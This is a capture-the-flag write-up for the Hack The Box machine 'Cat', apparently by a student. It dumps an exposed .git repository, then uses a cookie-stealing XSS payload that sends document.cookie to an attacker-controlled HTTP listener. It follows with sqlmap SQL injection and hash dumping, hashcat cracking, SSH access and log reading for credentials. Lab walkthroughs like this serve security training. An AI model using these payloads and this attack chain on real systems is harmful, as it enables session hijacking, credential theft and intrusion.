# cat.htb
## https://app.hackthebox.com/machines/Cat

### --- USER FLAG ---

As always, we start with a scan

```
sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53

Hexada@hexada ~/Downloads$ sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53                                                                                               
[sudo] password for Hexada: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 10:54 EEST
Warning: 10.10.11.53 giving up on port because retransmission cap hit (2).
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 349.36 seconds
```

Great, we found a very good leak, it's the `.git` directory.

```
Hexada@hexada ~/Downloads$ gobuster dir -u http://cat.htb/.git -w ~/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                                  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb/.git
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 1726]
/info                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/info/]
/config               (Status: 200) [Size: 92]
/logs                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/logs/]
/objects              (Status: 301) [Size: 309] [--> http://cat.htb/.git/objects/]
/description          (Status: 200) [Size: 73]
/branches             (Status: 301) [Size: 310] [--> http://cat.htb/.git/branches/]
/refs                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/refs/]
/HEAD                 (Status: 200) [Size: 23]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

The `Git` repository is a database that contains
    - all commits (the history of the project)
    - file contents (`blob` objects)
    - and the directory structure (`tree` objects)

A commit is essentially a snapshot of the project.

Every commit contains a reference to a tree object, which describes:
    - which files exist
    - where they are located
    - and what each file contains

When you change something in the project and make a new commit, you don't update an existing commit. Instead, you create a new commit, which references a new `tree` (if the structure or contents changed), and also references the previous commit. This way, each commit is linked to the one before it, forming a chain of history.

The object of 'git` have that structure:
  - commit: reference to the `tree`, contain commit creator's name, metadates, comments
  - tree: describes the structure of dirictories, namely, files, dirictories and their privileges
  - blob (binary large object): contain the file content
  - tag: reference to the other object, usually it's a `commit`

The .git directory has the following structure:
    /index: contains the content of files that are staged and will be included in the next commit
    /info: contains additional configuration files, such as `exclude`, which defines files and directories that should be ignored by `git` (similar to `.gitignore`, but local and not versioned)

```
Hexada@hexada ~/Downloads$ curl http://cat.htb/.git/HEAD                                                                                                                                  
ref: refs/heads/master
```

```
Hexada@hexada ~/Downloads$ curl http://cat.htb/.git/refs/heads/master                                                                                                                      
8c2c2701eb4e3c9a42162cfb7b681b6166287fd5
```

`.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy`

```
Hexada@hexada ~/app/vrm/cat.htb$ curl http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 --output 8c2c27_object                                                 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   121  100   121    0     0    810      0 --:--:-- --:--:-- --:--:--   812
Hexada@hexada ~/app/vrm/cat.htb$ ls                                             
```

```
Hexada@hexada ~/app/vrm/cat.htb$ cat 8c2c27_object | zlib-flate -uncompress                                                                                                                
commit 157tree c9e281ffb3f5431800332021326ba5e97aeb2764
author Axel <axel2017@gmail.com> 1725146774 +0000
committer Axel <axel2017@gmail.com> 1725146774 +0000

Cat v1
```

```
(myenv) Hexada@hexada ~/app/pentesting-tools/GitHacker$ githacker --url http://cat.htb/.git/ --output-folder /home/Hexada/app/vrm/cat.htb/git                                
2025-04-27 10:15:42 INFO 1 urls to be exploited
2025-04-27 10:15:42 INFO Exploiting http://cat.htb/.git/ into /home/Hexada/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d
2025-04-27 10:15:43 INFO Downloading basic files...
```

```
(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ ls                                                                                                 
accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
```

`admin.php`

```php
// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}
```

```
sudo python3 -m http.server 1717 --bind 10.10.16.59 
```

```
GET /join.php?username=<script>newImage().src='http://10.10.16.59:1717/?c='+document.cookie</script>&email=g.aa@.com&password=1234&registerForm=Register HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://cat.htb/join.php
Cookie: PHPSESSID=d1c62va6fqnt2tbkv1sjb3ru5h
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

```
(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ sudo python3 -m http.server 1717 --bind 10.10.16.59                                                 ==
[sudo] password for Hexada: 
Serving HTTP on 10.10.16.59 port 1717 (http://10.10.16.59:1717/) ...
10.10.11.53 - - [29/Apr/2025 00:30:35] code 404, message File not found
10.10.11.53 - - [29/Apr/2025 00:30:35] "GET /cookie?c=PHPSESSID=v5dtv2ammn19s5f96sk6q9e4jq HTTP/1.1" 404 -
```

![image](https://github.com/user-attachments/assets/d46f378f-a908-4687-9959-9265b0723ea5)

accept_cat.php
```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```

SQL injection

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

```
(myenv) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://cat.htb/accept_cat.php" --data="catName=test&catId=1" --cookie="PHPSESSID=v5dtv2ammn19s5f96sk6q9e4jq" --level=5 --risk=3 --batch 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6.10#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:23:42 /2025-07-04/
```

```
+---------+--------------------------+----------------------------------+----------+
| user_id | email                    | password                         | username |
+---------+--------------------------+----------------------------------+----------+
| 1       | axel2017@gmail.com       | d1bbba3670feb9435c9841e46e60ee2f | axel     |
| 2       | rosamendoza485@gmail.com | ac369922d560f17d6eeb8b2c7dec498c | rosa     |
+---------+--------------------------+----------------------------------+----------+
```

```
Hexada@hexada ~/pentest-env/vrm/cat.htb$ cat hashes.txt
d1bbba3670feb9435c9841e46e60ee2f
ac369922d560f17d6eeb8b2c7dec498c
```

```
hashcat -m 0 -a 0 hashes.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o passwords.txt

Host memory required for this attack: 1027 MB

Dictionary cache hit:
* Filename..: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384
```

```
Hexada@hexada ~/pentest-env/vrm/cat.htb$ cat passwords.txt                                                  
ac369922d560f17d6eeb8b2c7dec498c:soyuna*****
```

```
Hexada@hexada ~/pentest-env/vrm/cat.htb$ ssh rosa@cat.htb                                                
The authenticity of host 'cat.htb (10.10.11.53)' can't be established.
ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts.
rosa@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 03 Jul 2025 10:05:28 PM UTC

  System load:           0.62
  Usage of /:            54.4% of 6.06GB
  Memory usage:          25%
  Swap usage:            2%
  Processes:             249
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.53
  IPv6 address for eth0: dead:beef::250:56ff:fe94:99e1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jul  3 19:39:40 2025 from 10.10.14.180
rosa@cat:~$ 
```

```
rosa@cat:~$ nc -lnvp 1818 > linpeas.sh

(myenv) Hexada@hexada ~/pentest-env/pentesting-tools$ nc 10.10.11.53 1818 < linpeas.sh
```

```
rosa@cat:~$ cat /var/log/apache2/access.log
```

![image](https://github.com/user-attachments/assets/e072abae-d76d-4396-9228-72f01136622b)

```
Hexada@hexada ~/pentest-env/vrm/cat.htb$ ssh axel@cat.htb                                                                                                           ✚ ✭master 
axel@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 03 Jul 2025 10:56:08 PM UTC

  System load:           0.69
  Usage of /:            54.5% of 6.06GB
  Memory usage:          28%
  Swap usage:            2%
  Processes:             257
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.53
  IPv6 address for eth0: dead:beef::250:56ff:fe94:99e1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Thu Jul  3 22:34:29 2025 from 10.10.16.105
axel@cat:~$ ls
user.txt
axel@cat:~$ cat user.txt
b75e6e00098a3d6c86922*****
axel@cat:~$ 
```

### --- ROOT FLAG ---
